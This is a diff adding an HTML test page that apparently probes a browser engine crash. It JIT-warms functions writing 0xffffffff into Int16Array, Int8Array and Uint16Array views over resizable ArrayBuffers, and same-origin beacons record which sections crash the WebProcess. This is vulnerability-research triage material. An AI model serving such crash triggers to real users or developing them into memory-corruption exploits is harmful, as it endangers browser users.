@@ -1,0 +1,206 @@
+<!--
+  p608b: Isolate Int16Array crash from p608
+
+  p608 consistently crashes WebProcess after D-Int32Array-SURVIVED,
+  right when Int16Array warmup begins. This probe isolates:
+
+  A. Int16Array with resizable AB + 5 fillers (the crash candidate)
+  B. Int16Array with resizable AB + NO fillers (control)
+  C. Int16Array with FIXED AB + 5 fillers (control)
+  D. Int16Array with resizable AB + 5 fillers, storeVal=0xffffffff ONLY
+  E. Int8Array with resizable AB + 5 fillers
+  F. Uint16Array with resizable AB + 5 fillers
+
+  Each section sends BEFORE/AFTER beacons. Missing AFTER = crash.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608b</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608B-INT16-CRASH-ISOLATE');
+
+// ================================================================
+// SECTION A: Int16Array + resizable AB + 5 fillers (crash candidate)
+// Warmup with safe value first, fire with 0xffffffff second
+// ================================================================
+b('SEC-A:INT16-RESIZABLE-5FILL');
+
+function trigA(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Int16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flA=[];for(var i=0;i<8;i++)flA.push({x:1});
+
+b('A-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigA(42, flA);
+b('A-WARMUP-DONE');
+
+b('A-FIRE-FFFF');
+try{
+    trigA(0xffffffff, flA);
+    b('A-SURVIVED-FFFF');
+}catch(e){
+    b('A-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION B: Int16Array + resizable AB + NO fillers (control)
+// ================================================================
+b('SEC-B:INT16-RESIZABLE-NOFILL');
+
+function trigB(storeVal) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Int16Array(ab);
+    ta[3] = storeVal;
+    return 0;
+}
+
+b('B-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigB(42);
+b('B-WARMUP-DONE');
+
+b('B-FIRE-FFFF');
+try{
+    trigB(0xffffffff);
+    b('B-SURVIVED-FFFF');
+}catch(e){
+    b('B-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION C: Int16Array + FIXED AB + 5 fillers (control)
+// ================================================================
+b('SEC-C:INT16-FIXED-5FILL');
+
+function trigC(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100);  // NO maxByteLength — fixed size
+    var ta = new Int16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flC=[];for(var i=0;i<8;i++)flC.push({x:1});
+
+b('C-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigC(42, flC);
+b('C-WARMUP-DONE');
+
+b('C-FIRE-FFFF');
+try{
+    trigC(0xffffffff, flC);
+    b('C-SURVIVED-FFFF');
+}catch(e){
+    b('C-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION D: Int16Array + resizable AB + 5 fillers, ONLY 0xffffffff
+// (warmup AND fire with 0xffffffff — test if slow-path-first-time crashes)
+// ================================================================
+b('SEC-D:INT16-RESIZABLE-FFFF-ONLY');
+
+function trigD(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Int16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flD=[];for(var i=0;i<8;i++)flD.push({x:1});
+
+b('D-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigD(0xffffffff, flD);
+b('D-WARMUP-DONE');
+
+b('D-FIRE');
+try{
+    trigD(0xffffffff, flD);
+    b('D-SURVIVED');
+}catch(e){
+    b('D-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION E: Int8Array + resizable AB + 5 fillers
+// ================================================================
+b('SEC-E:INT8-RESIZABLE-5FILL');
+
+function trigE(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Int8Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flE=[];for(var i=0;i<8;i++)flE.push({x:1});
+
+b('E-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigE(42, flE);
+b('E-WARMUP-DONE');
+
+b('E-FIRE-FFFF');
+try{
+    trigE(0xffffffff, flE);
+    b('E-SURVIVED-FFFF');
+}catch(e){
+    b('E-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+// SECTION F: Uint16Array + resizable AB + 5 fillers
+// ================================================================
+b('SEC-F:UINT16-RESIZABLE-5FILL');
+
+function trigF(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint16Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+
+var flF=[];for(var i=0;i<8;i++)flF.push({x:1});
+
+b('F-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigF(42, flF);
+b('F-WARMUP-DONE');
+
+b('F-FIRE-FFFF');
+try{
+    trigF(0xffffffff, flF);
+    b('F-SURVIVED-FFFF');
+}catch(e){
+    b('F-EXCEPTION:'+e.message);
+}
+
+// ================================================================
+b('P608B-COMPLETE');
+}
+
+setTimeout(main, 200);
+</script></head><body>p608b: Int16Array crash isolation</body></html>
